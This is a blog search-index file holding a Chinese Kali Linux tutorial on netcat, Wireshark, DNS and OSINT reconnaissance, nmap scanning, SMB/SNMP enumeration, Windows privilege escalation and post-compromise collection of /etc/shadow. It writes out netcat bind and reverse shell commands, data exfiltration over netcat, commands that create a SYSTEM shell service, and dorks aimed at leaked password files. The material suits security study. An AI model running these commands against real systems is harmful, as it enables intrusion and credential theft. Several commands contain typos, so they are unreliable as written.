<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Kali使用教程（一）：常用命令和基本工具使用</title>
    <url>/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><code>netstat -pantu</code> ：查看本机与外界的TCP/UDP连接</li><li><code>sudo passwd root</code>：为root设置密码</li></ul><a id="more"></a><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="NC-NETCAT"><a href="#NC-NETCAT" class="headerlink" title="NC-NETCAT"></a><code>NC-NETCAT</code></h4><blockquote><p>nc是一款远程传输，控制工具。使用nc -h 命令查看参数描述</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608153428232.png" alt="image-20200608153428232"></p><h5 id="NC——获取Banner信息"><a href="#NC——获取Banner信息" class="headerlink" title="NC——获取Banner信息"></a>NC——获取Banner信息</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nv x.x.x.x port  nc作为客户端连接对方服务器</span><br><span class="line">说明：</span><br><span class="line">	-v 显示详细信息</span><br><span class="line">	-n 后面添加ip地址，不会进行DNS解析</span><br></pre></td></tr></table></figure><p>测试：</p><blockquote><p>首先使用ping + 域名 获取ip地址</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608105457977.png" alt="image-20200608105457977"></p><blockquote><p>由于pop3的端口为110，直接用nc -nv命令连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608110108800.png" alt="image-20200608110108800"></p><h5 id="NC——传输文本（Telnet）"><a href="#NC——传输文本（Telnet）" class="headerlink" title="NC——传输文本（Telnet）"></a>NC——传输文本（Telnet）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A:nc -l -p port 监听端port端口</span><br><span class="line">B:nc -nv x.x.x.x port 发送端,x.x.x.x为监听端ip</span><br><span class="line"></span><br><span class="line">用途：电子取证、信息收集</span><br><span class="line"></span><br><span class="line">示例：我们希望将远程服务端的文件目录发送到本机，并且不显示远程主机上，可以使用如下命令:</span><br><span class="line"></span><br><span class="line">远程服务器：ls -l | nc -nv x.x.x.x port -q 1 这里-q 1表示发送完成后等待1s时间就退出nc</span><br><span class="line"></span><br><span class="line">接收端：nc -l -p port &gt; log.txt 监听并将信息保存在log.txt文件中大萨达</span><br></pre></td></tr></table></figure><h5 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">传输文件: </span><br><span class="line">	从B--&gt;A</span><br><span class="line">	A: nc -lp port &gt; video.mp4</span><br><span class="line">	B: nc -nv x.x.x.x port &lt; video.mp4 -q 1 </span><br><span class="line">			&lt;符号表示传入数据，&gt;符号表示保存数据</span><br><span class="line">	</span><br><span class="line">    也可以从A--&gt;B</span><br><span class="line">    A: nc -lp port &lt; video.mp4 -q 1 </span><br><span class="line">	B: nc -nv x.x.x.x port &gt; video.mp4 </span><br><span class="line"></span><br><span class="line">传输目录：</span><br><span class="line">	原理类似，只不过需要在传输过程对目录打包和解压</span><br><span class="line">	A:tar -cvf - /music | nc -l -p port -q 1</span><br><span class="line">	B:nc -nv x.x.x.x port | tar -xvf -</span><br></pre></td></tr></table></figure><h5 id="NC——端口扫描（不太准确，不常用）"><a href="#NC——端口扫描（不太准确，不常用）" class="headerlink" title="NC——端口扫描（不太准确，不常用）"></a>NC——端口扫描（不太准确，不常用）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nvz x.x.x.x 1-65535 探测所有tcp端口</span><br><span class="line">nc -nvzu x.x.x.x 1-1024	探测udp端口</span><br></pre></td></tr></table></figure><h5 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">正向控制：</span><br><span class="line">	A:nc -lp port -c bash A提供bash</span><br><span class="line">	B:nc x.x.x.x port B使用bash</span><br><span class="line">	</span><br><span class="line">反向控制： </span><br><span class="line">	A:nc -lp port A使用bash</span><br><span class="line">	B:nc x.x.x.x port -c bash B提供bash</span><br><span class="line">	</span><br><span class="line">思考：在渗透测试中，正向控制一般是会被防火墙拦截的，所以可以尝试反向控制，让服务端连接自己暴露的端口</span><br><span class="line"></span><br><span class="line">注意：Windwos平台将bash改成cmd</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>NC缺乏加密和身份验证的能力，不安全。可以使用NCAT来弥补NC的不足， 因为它是支持SSL加密，NCAT包含于nmap中</p></blockquote><h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><code>Wireshark</code></h4><blockquote><p>Wireshark是一款抓包嗅探、协议分析的工具。</p></blockquote><h5 id="使用wireshark抓包"><a href="#使用wireshark抓包" class="headerlink" title="使用wireshark抓包"></a>使用wireshark抓包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">这里以抓取本机网卡数据包为例。首先打开终端，尝试ping百度</span><br><span class="line"></span><br><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">同时打开wireshark，选则虚拟机网卡eth0，再启动抓包</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608163108785.png" alt="image-20200608163108785"></p><blockquote><p>这里可以保存抓包数据文件，建议保存为pcap格式，兼容性较好。</p></blockquote><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><blockquote><p>wireshark可以针对ip、域名、协议进行过滤，支持组合表达式，称为过滤器。如下图中，可以选则当前协议行作为过滤器应用。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608165600432.png" alt="image-20200608165600432"></p><h5 id="常见协议包"><a href="#常见协议包" class="headerlink" title="常见协议包"></a>常见协议包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wireshark默认通过端口来识别协议类型，如80端口识别为http，如有必要需要手动指定协议类型</span><br><span class="line"></span><br><span class="line">数据包协议如下：ARP、ICMP、TCP、UDP、DNS、http、ftp</span><br><span class="line"></span><br><span class="line">TCP数据流：HTTP、SMTP、POP3、SSL/TLS（加密传输，无法查看内容）</span><br></pre></td></tr></table></figure><h5 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">follow</span> tcp <span class="keyword">stream：查看传输内容</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Endpoints:查看每种协议具体的ip、包大小、发送数量。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">协议分级：查看当前帧下的所有协议流量所占百分比。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">分组长度：查看不同大小包所占百分比。小包过多会导致瘫痪，可能是攻击行为。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Conversitions：查看所有会话之间的通信情况。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">专家系统：针对连接提供一些建议或提示</span></span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><blockquote><p>wireshark 不适用于抓取大量报，因此企业使用一般会使用类似于</p><p>Sniffer、Cace、Cascad poit等。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="DNS信息收集——NSLOOKUP"><a href="#DNS信息收集——NSLOOKUP" class="headerlink" title="DNS信息收集——NSLOOKUP"></a>DNS信息收集——NSLOOKUP</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">使用nslookup查看域名解析过程和对应ip</span><br><span class="line"></span><br><span class="line">tosang@kali:~/桌面$ nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> www.baidu.com</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.com   canonical name = www.a.shifen.com.</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.125</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.121</span><br></pre></td></tr></table></figure><h4 id="DNS信息收集——DIG（更强大）"><a href="#DNS信息收集——DIG（更强大）" class="headerlink" title="DNS信息收集——DIG（更强大）"></a>DNS信息收集——DIG（更强大）</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609102507339.png" alt="image-20200609102507339"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">根据自定义域名服务器查询：dig @8.8.8.8 www.sina.com mx</span><br><span class="line"></span><br><span class="line">正向查询：dig www.sina.com any </span><br><span class="line"></span><br><span class="line">反向查询（使用ptr反向解析）: dig +noall +answer -x 8.8.8.8</span><br><span class="line">		其中+noall +answer表示省略无用信息</span><br><span class="line"></span><br><span class="line">bind版本信息: dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com </span><br><span class="line">			通过查询bind版本信息可以分析是否存在漏掉可以利用</span><br><span class="line"></span><br><span class="line">DNS追踪: dig +trace example.com</span><br><span class="line"></span><br><span class="line">抓包比较递归查询、迭代查询过程的区别</span><br></pre></td></tr></table></figure><hr><blockquote><p>DNS追踪示例：图中是13个根域名服务器（root域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105201886.png" alt="image-20200609105201886"></p><blockquote><p>接着查询.com域名服务器地址（com域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105435329.png" alt="image-20200609105435329"></p><blockquote><p>然后从这些.com域名中随机挑选一个ip去查询baidu.com域的ns记录</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111657846.png" alt="image-20200609111657846"></p><blockquote><p>最后从ns记录中随机挑选一个去查询<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb23orrDlvZXlvpfliLBjbmFtZee7k+aenO+8jOino+aekGNuYW1l5Y+v5Lul5LuO55m+5bqm55qE5Z+f5ZCN5pyN5Yqh5Zmo77yIbnPvvInlvpfliLDmnIDnu4hpcOWcsOWdgA==">www.baidu.com记录得到cname结果，解析cname可以从百度的域名服务器（ns）得到最终ip地址<i class="fa fa-external-link-alt"></i></span></p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111723401.png" alt="image-20200609111723401"></p><h4 id="DNS区域传输（Zone-Transfer）"><a href="#DNS区域传输（Zone-Transfer）" class="headerlink" title="DNS区域传输（Zone Transfer）"></a>DNS区域传输（Zone Transfer）</h4><blockquote><p>区域传输是指域名服务器之间同步数据的过程，通过区域传输可以获得某一个域里面的所有主机记录</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">以下命令可以尝试去连接域名服务器，但一般会被拒绝</span><br><span class="line">dig @ns1.example.com example.com axfr</span><br><span class="line">host -T -l sina.com8.8.8.8</span><br></pre></td></tr></table></figure><h4 id="DNS爆破"><a href="#DNS爆破" class="headerlink" title="DNS爆破"></a>DNS爆破</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt </span><br><span class="line">	fierce自带字典host.txt，可以通过命令 查看</span><br><span class="line"></span><br><span class="line">dnsdict6 -d4 -t 16 -x sina.com </span><br><span class="line">	默认集成多种字典，命中率高，执行速度快，最常用</span><br><span class="line"></span><br><span class="line">dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -0 sina.xml</span><br><span class="line"></span><br><span class="line">dnsmap sina.com -W dns.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -d sina.com -lifetime 10 -t brt -D dnsbig.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -t std -d sina.com</span><br></pre></td></tr></table></figure><h4 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">说明：一般大型互联网企业域名都做了反查询，所以会查不到</span><br><span class="line"></span><br><span class="line">Whois </span><br><span class="line"></span><br><span class="line">whois -h whois.apnic.net 192.0.43.10</span><br></pre></td></tr></table></figure><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHODAN：使用前需要到shodan官网注册一个账号，并获取自己的API Key</span><br><span class="line"></span><br><span class="line">搜索联网的设备</span><br><span class="line">Banner: http、 ftp、 ssh、 telnet</span><br><span class="line">https://www.shodanio/</span><br><span class="line">常见filter:</span><br><span class="line">	net (192. 168.20.1)</span><br><span class="line">	city</span><br><span class="line">	country (CN、US)</span><br><span class="line">	port (80、 21、22、23)</span><br><span class="line">	OS</span><br><span class="line">	Hostname (主机或域名)</span><br><span class="line">	server</span><br><span class="line">	</span><br><span class="line">示例：搜索中国地区端的81端口ip</span><br><span class="line">port:81 country:CN HTTP/1.1 200</span><br></pre></td></tr></table></figure><blockquote><p>使用示例：首先通过nc获取某个域名的ip，这里以gscaep.ac.cn为例</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161551929.png" alt="image-20200609161551929"></p><blockquote><p>使用shodan来搜索该ip的所有信息</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161728440.png" alt="image-20200609161728440"></p><blockquote><p>这一刀这里暴露了使用的数据库版本及其端口信息，可以尝试用nc去连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609162101517.png" alt="image-20200609162101517"></p><h4 id="GOOGLE搜索方法"><a href="#GOOGLE搜索方法" class="headerlink" title="GOOGLE搜索方法"></a>GOOGLE搜索方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+充值 -支付  +代表含有，-代表排除</span><br><span class="line"></span><br><span class="line">北京的电子商务公司—— 北京 intitle:电子商务 intext:法人 intext:电话</span><br><span class="line"></span><br><span class="line">阿里网站上的北京公司联系人——北京 site:alibaba.com inurl:contact</span><br><span class="line"></span><br><span class="line">塞班司法案的PDF文档——SOX filetype:pdf</span><br><span class="line"></span><br><span class="line">法国的支付相关页面——payment site:fr</span><br><span class="line"></span><br><span class="line">一些常用实例：</span><br><span class="line">inurt:"level/15/exec/-/show"</span><br><span class="line">intille: "netbotz appliance" "ok"</span><br><span class="line">inurl /admin/login.php</span><br><span class="line">inurt:qq.txt</span><br><span class="line">filetype:xls "username| password"</span><br><span class="line">inud:ftp "password" filetype:xls site:baidu.com</span><br><span class="line">Inurd:Service.pwd</span><br><span class="line">http://exploit.db.com/google-dorks</span><br></pre></td></tr></table></figure><h4 id="搜索工具"><a href="#搜索工具" class="headerlink" title="搜索工具"></a>搜索工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theHarvester 可以使用google、bing等搜索引擎搜索文域名、邮件，需要翻墙</span><br><span class="line"></span><br><span class="line">Maltego 图形化展示搜索工具，kali十大工具之一</span><br></pre></td></tr></table></figure><h4 id="文件信息——METADATA（元数据）"><a href="#文件信息——METADATA（元数据）" class="headerlink" title="文件信息——METADATA（元数据）"></a>文件信息——METADATA（元数据）</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">exiftool</span> <span class="string">xx.jpg  查看图片Exif图片信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Foca</span> <span class="string">windows平台软件</span></span><br></pre></td></tr></table></figure><h4 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><blockquote><p>RECON-NG是一个全特性的，基于Python的web侦探框架。输入help查看所有命令含义</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609191006019.png" alt="image-20200609191006019"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">常用命令：</span><br><span class="line"></span><br><span class="line">recon-ng sina   建立名为sina的工作区</span><br><span class="line">keys add baidu_api api 为baidu_api添加api</span><br><span class="line">keys remove xxx 移除某个api</span><br><span class="line">keys list 查看所有api</span><br><span class="line"></span><br><span class="line">安装模块：</span><br><span class="line">marketplace refresh # 更新模块列表</span><br><span class="line">marketplace search hackertarget # 搜索 hackertarget 模块，可以发现支持模糊搜索</span><br><span class="line">marketplace install recon/domains-hosts/hackertarget # 复制模块名，安装</span><br><span class="line"></span><br><span class="line">使用模块：</span><br><span class="line">modules load recon/domains-hosts/hackertarget # 加载模块</span><br><span class="line">info # 查看模块的描述信息及参数。这里发现该模块是用来搜索主机名。</span><br><span class="line"></span><br><span class="line">help # 查看该模块下的使用命令，其中 options 用来修改模块的参数。（goptions 是全局参数，在非模块模式下才可修改。）</span><br><span class="line">options set SOURCE rapid7.com # 设置 SOURCE 参数（用来探测 rapid7.com的主机）</span><br><span class="line">run # 设置好参数后，直接运行。</span><br><span class="line">show hosts # 在上述 hackertarget 的描述中发现，会把搜索记录 放到 hosts 表中，可以使用 show 命令查看。</span><br></pre></td></tr></table></figure><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="二层发现——arping"><a href="#二层发现——arping" class="headerlink" title="二层发现——arping"></a>二层发现——arping</h4><blockquote><p>二层发现使用arp协议，在局域网下进行</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arping 用于在局域网通过目标ip获取mac地址</span><br><span class="line"></span><br><span class="line">arping 1.1.1.1 -c 1</span><br><span class="line">arping 1.1.1.1 -d 发现同一ip下重复的mac</span><br><span class="line">arping c1 1.1.1.1 | grep "bytes from" | cut d"-f5 | cut d"T"-f2 I cut -d"]"-f 1</span><br><span class="line">脚本</span><br><span class="line">	arping l.sh etho &gt; addrs</span><br><span class="line">	arping 2.sh addrs</span><br><span class="line"></span><br><span class="line">场景：通过编写脚本，arping可以发现子网段的所有连接的ip及其mac地址</span><br></pre></td></tr></table></figure><h4 id="二层发现——nmap（常用）"><a href="#二层发现——nmap（常用）" class="headerlink" title="二层发现——nmap（常用）"></a>二层发现——nmap（常用）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -sn 扫描ping，但是不去扫描端口</span><br><span class="line">		namp在扫描的时候会尝试对找到的ip进行反向查询dns获取其域名</span><br><span class="line">nmap -iL iplist.txt sn</span><br></pre></td></tr></table></figure><h4 id="二层发现——Netdiscover"><a href="#二层发现——Netdiscover" class="headerlink" title="二层发现——Netdiscover"></a>二层发现——Netdiscover</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Netdiscover专用于二层发现，可用于无线和交换网络环境，主动和被动探测</span><br><span class="line"></span><br><span class="line">主动探测：</span><br><span class="line">netdiscover -i ethO T 1.1.1 .0/24</span><br><span class="line">netdiscover -1 iplist.txt</span><br><span class="line"></span><br><span class="line">被动：</span><br><span class="line">（主动arp容易触发报警，伪装成局域网一部分，截取arp数据包分析）</span><br><span class="line">netdiscover -P</span><br></pre></td></tr></table></figure><h4 id="二层发现——Scapy"><a href="#二层发现——Scapy" class="headerlink" title="二层发现——Scapy"></a>二层发现——Scapy</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Scapy</span><br><span class="line">	作为Python库进行调用</span><br><span class="line">	也可作为单独的工具使用</span><br><span class="line">	抓包、分析、创建、修改、注入网络流量</span><br><span class="line"></span><br><span class="line">apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">Scapy</span><br><span class="line">	ARP().display()</span><br><span class="line">	Sr1()</span><br><span class="line">	</span><br><span class="line">Python脚本</span><br><span class="line">	Arpl.py</span><br><span class="line">	Arp2.py</span><br></pre></td></tr></table></figure><h4 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h4><blockquote><p>优点：可路由、速度比较快<br>缺点：速度比二层慢、经常被边界防火墙过滤<br>协议：IP、ICMP协议。在广域网进行</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">说明：ttl值在linux系统性一般是64，每经过一跳路由自动减一</span><br><span class="line"></span><br><span class="line">Ping 1.1.1.1 -c 2 </span><br><span class="line">		-c指定发送几个请求</span><br><span class="line">Ping-R 1.1.1.1 / traceroute 1.1.1.1</span><br><span class="line">ping 1.1.1.1-C 1 | grep "bytes from" | cut -d "" -f4 | cut-d":"-f 1</span><br><span class="line"></span><br><span class="line">pmap -sn 1.1.1.1 -255</span><br><span class="line">nmap -iL iplist.txt -sn</span><br><span class="line"></span><br><span class="line">Hping</span><br><span class="line">	能够发送几乎任意TCP/IP包</span><br><span class="line">	功能强大但每次只能扫描一个目标</span><br><span class="line">	</span><br><span class="line">hping3 1.1.1.1 -icmp -C 2</span><br><span class="line">for addr in $(seq 1 254); do hping3 1.1.1.$addr icmp C I &gt;&gt; handle.txt &amp; done</span><br></pre></td></tr></table></figure><h4 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h4><blockquote><p>优点：可路由且结果可靠、不太可能被防火墙过滤、甚至可以发现所有端口都被过滤的主机<br>缺点：基于状态过滤的防火墙可能过滤扫描、全端口扫描速度慢<br>TCP：未经请求的ACK- RST、SYN-SYN/ACK、 RST<br>UDP：ICMP端口不可达、一去不复返</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -PU53 -sn 使用udp发现</span><br><span class="line">nmap 1.1.1.1-254 -PA80 -sn 使用TCP发现（ack包 ）</span><br><span class="line">nmap -iL iplist.txt -PA80 -sn</span><br><span class="line"></span><br><span class="line">端口扫描：</span><br><span class="line">Nmap</span><br><span class="line">nmap -sU 1.1.1.1 默认的1000个参数</span><br><span class="line">		ICMP host-unreachable说明端口关闭</span><br><span class="line">		没有回应说明可能开启</span><br><span class="line">nmap 1.1.1.1 -sU-p 53</span><br><span class="line">nmap -iL iplist.txt -sU P 1-200</span><br></pre></td></tr></table></figure><blockquote><p>所有的TCP扫描都是基于三次握手的变化来判断目标端口的状态</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">隐蔽扫描：</span><br><span class="line">	即每次不建立完整三次连接，只发生syn信息</span><br><span class="line">	应用日志不记录扫描行为，较为隐蔽</span><br><span class="line">	发送流程为：--&gt;使用scapy发送Syn包给目标主机</span><br><span class="line">    		  &lt;--目标主机回复syn/ack包</span><br><span class="line">    		  --&gt;本机操作系统内核会识别到异常握手，发出RST请求</span><br><span class="line">    屏蔽内核的RST请求：</span><br><span class="line">    iptables -A OUTPUT -P tcp --tcp-flags RST RST -d 本地ip -j DROP</span><br><span class="line"></span><br><span class="line">	Scapy命令：</span><br><span class="line">sr1(IP(dst="192.168.60.3]/TCP(dport=80),timneout=l,verbose=1)</span><br><span class="line">	</span><br><span class="line">	nmap命令：</span><br><span class="line">	nmap -sS 1.1.1.1 -p 80 21,25.110.443</span><br><span class="line">	nmap -sS 1.1.1.1 -P -65535 --open</span><br><span class="line">	nmap -sS 1.1.1.1 -P  --open</span><br><span class="line">	nmap -sS -iL iplist.txt -P 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">僵尸扫描</span><br><span class="line">	极度隐蔽</span><br><span class="line">	实施条件苛刻</span><br><span class="line">	可伪造源地址</span><br><span class="line">	选择僵尸机：闲置系统且系统使用递增的IPID，不能全是0</span><br><span class="line">发现僵尸机： </span><br><span class="line">nmap -P 80 192.168.1.133 --script=ipidseq.nse</span><br><span class="line">扫描目标：</span><br><span class="line">nmap 172.16.36.135 -sl 172.16.36.134 Pn p 0- 100</span><br></pre></td></tr></table></figure><h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><blockquote><p>SNMP:<br>简单网络管理协议<br>Community strings<br>信息查询或重新配置<br>识别和绕过防火墙筛选</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">扫描banner：</span><br><span class="line">nc -nv x.x.x.x</span><br><span class="line"></span><br><span class="line">dmitry -p 172. 16.36.135</span><br><span class="line">dmitry -pb 172.16.36.135</span><br><span class="line"></span><br><span class="line">nmap -sI 1.1.1.1 -P 22 -script=banner </span><br><span class="line">nmap 域名/IP            （最强大）</span><br></pre></td></tr></table></figure><h4 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h4><blockquote><p>用处不大，现在的服务器会限制特定ip访问snmp</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snmp:</span><br><span class="line">	信息的金矿</span><br><span class="line">	经常被错误配置</span><br><span class="line">	public / private / manager</span><br><span class="line">MIB Tree:</span><br><span class="line">	SNMP Management Information Base (MIB)</span><br><span class="line">	树形的网络设备管理功能数据库</span><br><span class="line">	1.3.6.1.4.1.77.1.2.25</span><br><span class="line">onesixtyone 1.1.1.1 public</span><br><span class="line">onesixtyone -C dict.txt -i hosts -o my.log -W 100</span><br><span class="line">可读性强的工具：</span><br><span class="line">snmpcheck -t 192. 168.20.199</span><br><span class="line">snmpcheck -t 192. 168.20.199 -C private -V 2</span><br><span class="line">snmpcheck -t 192. 168.20.199 -W</span><br></pre></td></tr></table></figure><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h4><blockquote><p><code>Server Message Block</code> 协议是微软历史上出现安全问题最多的协议，实现复杂，默认开放，文件共享</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -v -p 139,445 192.168.60.1-20</span><br><span class="line">nmap 192.168.60.4 -p 139,445 --script=smb-os- discovery.nse</span><br><span class="line">nmap -v -P 139,445 --script=smb-check-vulns --script-args=unsafe=1 1.1.1.1</span><br><span class="line">nbtscan -r 192. 168.60.0/24</span><br><span class="line">enum4linux -a 192.1 68.60.10</span><br></pre></td></tr></table></figure><h4 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">WEB应用防火墙</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">-l</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">http://www.microsoft.com</span></span><br><span class="line"><span class="attr">nmap</span> <span class="string">www.microsoft.com --script=http-waf-detect.nse</span></span><br></pre></td></tr></table></figure><h3 id="弱点-漏洞-扫描"><a href="#弱点-漏洞-扫描" class="headerlink" title="弱点(漏洞)扫描"></a>弱点(漏洞)扫描</h3><blockquote><p>kali集成了漏洞利用工具，使用searchsploit，我们可以搜索软件当前存在的漏洞及其攻击代码。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200611094925425.png" alt="image-20200611094925425"></p><blockquote><p>此外，NEXPOSE也是一款面向企业的强大的漏洞扫描工具，可以对web页面、操作系统进行登录扫描或黑盒扫描。NEXPOSE会将扫描到的漏洞按CVSS评级进行打分，并且可以生产报告。</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote><p>Admin提权为System</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Windows system账号</span><br><span class="line">官方工具：</span><br><span class="line">	SysInternal suite</span><br><span class="line">	https://technet.microsoft.com/en-us/sysinternals/bb545027</span><br><span class="line">	psexec -i -S d taskmgr</span><br><span class="line"></span><br><span class="line">xp系统下：</span><br><span class="line">	at 19:39 /interactive cmd 该命令会定时启动一个system权限的cmd</span><br><span class="line">								（只能在xp系统使用）</span><br><span class="line">通过服务方式：</span><br><span class="line">	SC Create syscmd binPath= "cmd /K start" type= own type= interact</span><br><span class="line">	SC start syscmd</span><br><span class="line">	</span><br><span class="line">隐蔽注入：</span><br><span class="line">	上面的几种方式会创建单独的进程，可能被发现，可以使用pinjector进行隐蔽注入，注入到某个system权限的进程中，然后通过nc可以远程shell</span><br></pre></td></tr></table></figure><h4 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">	Wireshark</span><br><span class="line">	Omnipeek</span><br><span class="line">	commview</span><br><span class="line">	Sniffpass</span><br><span class="line">Linux：</span><br><span class="line">	Tcpdump</span><br><span class="line">	Wireshark</span><br><span class="line">	Dsniff</span><br></pre></td></tr></table></figure><h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><blockquote><p>当我们获取到某个主机的root权限后，我们要尽可能收集其信息</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Linux:</span><br><span class="line">    /etc/resolv.conf   dns配置信息</span><br><span class="line">    /etc/passwd   存放用户账户</span><br><span class="line">    /etc/shadow	   存放用户密码</span><br><span class="line">    whoami, who -a</span><br><span class="line">    ifconfig -a, iptables 